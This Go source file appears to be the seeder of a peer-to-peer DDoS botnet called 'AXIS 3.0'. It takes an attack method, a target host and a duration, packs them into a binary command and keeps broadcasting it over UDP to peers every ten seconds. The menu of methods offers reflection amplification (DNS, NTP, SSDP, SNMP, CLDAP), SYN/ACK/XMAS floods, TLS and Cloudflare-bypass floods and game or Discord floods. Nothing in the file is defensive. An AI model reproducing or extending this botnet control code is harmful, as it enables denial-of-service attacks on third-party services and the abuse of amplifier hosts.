package main

import (
	"encoding/binary"
	"fmt"
	"net"
	"os"
	"strconv"
	"strings"
	"time"
)

/*
 * AXIS 3.0 P2P Seeder
 * Seeds attack commands into the P2P network.
 * Works like a torrent seeder - continuously propagates attack commands
 * to all peers in the network via UDP.
 */

const (
	P2P_CMD_ATTACK = 0x10
	P2P_PORT       = 49152
	MAX_TTL        = 5
)

/* Seed peers - entry points into the P2P network */
var seedPeers = []string{
	"127.0.0.1:49152",
}

func main() {
	fmt.Println("AXIS 3.0 P2P Seeder")
	fmt.Println("=====================")
	fmt.Println("")
	fmt.Printf("Seed peers: %v\n", seedPeers)
	fmt.Println("")
	fmt.Println("Usage:")
	fmt.Println("  seeder <method> <target> <duration>")
	fmt.Println("")
	fmt.Println("Methods: axis-l7, tlsplus, tls, cf, udp, pps, game, discord,")
	fmt.Println("         syn, ack, fin, rst, tcpconn, xmas, null, window,")
	fmt.Println("         dns-amp, ntp-amp, ssdp-amp, snmp-amp, cldap-amp,")
	fmt.Println("         icmp, greip, greeth")
	fmt.Println("")

	if len(os.Args) < 4 {
		fmt.Println("Error: missing arguments")
		os.Exit(1)
	}

	method := os.Args[1]
	target := os.Args[2]
	duration, err := strconv.Atoi(os.Args[3])
	if err != nil {
		fmt.Printf("Error: invalid duration: %v\n", err)
		os.Exit(1)
	}

	attackID := getAttackID(method)
	if attackID == 255 {
		fmt.Printf("Error: unknown method: %s\n", method)
		os.Exit(1)
	}

	fmt.Printf("Seeding attack: %s -> %s for %ds\n", method, target, duration)
	fmt.Println("Propagating through P2P network...")

	packet := buildAttackPacket(attackID, target, duration)

	/* Continuously seed the network (torrent-style) */
	seedContinuously(packet)
}

func buildAttackPacket(attackID uint8, target string, duration int) []byte {
	var durationInt uint32 = uint32(duration)

	/* Parse target IP */
	ip := net.ParseIP(target)
	if ip == nil {
		/* Try resolving as domain */
		ips, err := net.LookupIP(target)
		if err != nil || len(ips) == 0 {
			ip = net.ParseIP("1.1.1.1")
		} else {
			ip = ips[0].To4()
			if ip == nil {
				ip = net.ParseIP("1.1.1.1")
			}
		}
	}
	ip4 := ip.To4()
	if ip4 == nil {
		ip4 = net.ParseIP("1.1.1.1").To4()
	}

	/* Build attack payload:
	 * Byte 0: Attack ID
	 * Byte 1: Target count
	 * Byte 2-5: Target IP
	 * Byte 6: Netmask
	 * Byte 7: Options count
	 * Last 4 bytes: Duration (little endian)
	 */
	buf := make([]byte, 14)
	buf[0] = attackID
	buf[1] = 1
	copy(buf[2:6], ip4)
	buf[6] = 32
	buf[7] = 0
	binary.LittleEndian.PutUint32(buf[10:14], durationInt)

	return buf
}

func seedContinuously(attackBuf []byte) {
	/* Build P2P packet: CMD(1) + TTL(1) + AttackPayload */
	packet := make([]byte, 2+len(attackBuf))
	packet[0] = P2P_CMD_ATTACK
	packet[1] = 0 // TTL starts at 0

	/* Resolve all seed peers */
	addrs := make([]*net.UDPAddr, 0, len(seedPeers))
	for _, seed := range seedPeers {
		addr, err := net.ResolveUDPAddr("udp", seed)
		if err != nil {
			fmt.Printf("Warning: failed to resolve seed %s: %v\n", seed, err)
			continue
		}
		addrs = append(addrs, addr)
	}

	if len(addrs) == 0 {
		fmt.Println("Error: no valid seed peers")
		os.Exit(1)
	}

	/* Create UDP socket */
	conn, err := net.ListenUDP("udp", nil)
	if err != nil {
		fmt.Printf("Error: failed to create socket: %v\n", err)
		os.Exit(1)
	}
	defer conn.Close()

	fmt.Printf("Sending to %d seed peers...\n", len(addrs))

	/* Torrent-style: continuously seed the network */
	ticker := time.NewTicker(10 * time.Second)
	defer ticker.Stop()

	sendToAll(conn, addrs, packet)

	for range ticker.C {
		sendToAll(conn, addrs, packet)
		fmt.Println("[*] Re-seeding attack command...")
	}
}

func sendToAll(conn *net.UDPConn, addrs []*net.UDPAddr, packet []byte) {
	for _, addr := range addrs {
		_, err := conn.WriteToUDP(packet, addr)
		if err != nil {
			fmt.Printf("Warning: failed to send to %s: %v\n", addr.String(), err)
		}
	}
}

func getAttackID(method string) uint8 {
	method = strings.ToLower(method)
	switch method {
	case "udp":
		return 0
	case "game":
		return 1
	case "discord":
		return 2
	case "pps":
		return 3
	case "tls":
		return 4
	case "tlsplus", "tls+":
		return 5
	case "cf":
		return 6
	case "axis-l7", "l7":
		return 7
	case "dns-amp":
		return 8
	case "ntp-amp":
		return 9
	case "ssdp-amp":
		return 10
	case "snmp-amp":
		return 11
	case "cldap-amp":
		return 12
	case "syn":
		return 13
	case "ack":
		return 14
	case "fin":
		return 15
	case "rst":
		return 16
	case "tcpconn":
		return 17
	case "xmas":
		return 18
	case "null":
		return 19
	case "window":
		return 20
	case "icmp":
		return 21
	case "greip":
		return 22
	case "greeth":
		return 23
	default:
		return 255
	}
}
